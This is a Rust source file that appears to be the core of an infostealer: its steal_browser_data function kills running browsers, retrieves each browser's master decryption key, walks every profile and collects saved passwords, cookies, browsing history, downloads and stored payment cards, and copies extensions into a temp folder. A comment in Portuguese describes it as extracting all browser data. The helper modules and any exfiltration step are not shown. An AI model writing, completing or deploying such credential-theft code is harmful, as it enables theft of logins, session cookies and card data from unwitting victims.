mod config;
mod crypto;
mod database;
mod extensions;
mod types;
mod utils;

use std::{env, fs};

pub use types::BrowserData;

pub fn steal_browser_data() -> BrowserData {
    utils::kill_browser_processes();

    let output_dir = env::temp_dir().join("BrowserExtensions");
    let _ = fs::create_dir_all(&output_dir);

    let mut all_data = BrowserData::default();
    let browsers = config::get_browser_list();

    for browser in browsers {
        if !browser.path.exists() {
            continue;
        }

        let master_key = match crypto::get_master_key(&browser.path) {
            Some(key) => key,
            None => continue,
        };

        let profiles = utils::discover_profiles(&browser.path);

        for profile in profiles.iter() {
            let profile_path = if profile.is_empty() {
                browser.path.clone()
            } else {
                browser.path.join(profile)
            };

            if !profile_path.exists() {
                continue;
            }

            // Extrai todos os dados do navegador
            all_data.passwords.extend(database::get_passwords(
                browser.name,
                &profile_path,
                &master_key,
            ));
            all_data.cookies.extend(database::get_cookies(
                browser.name,
                &profile_path,
                &master_key,
            ));
            all_data
                .history
                .extend(database::get_history(browser.name, &profile_path));
            all_data
                .downloads
                .extend(database::get_downloads(browser.name, &profile_path));
            all_data.cards.extend(database::get_cards(
                browser.name,
                &profile_path,
                &master_key,
            ));
            all_data.extensions_count +=
                extensions::get_extensions(browser.name, &profile_path, &output_dir);
        }
    }

    all_data
}
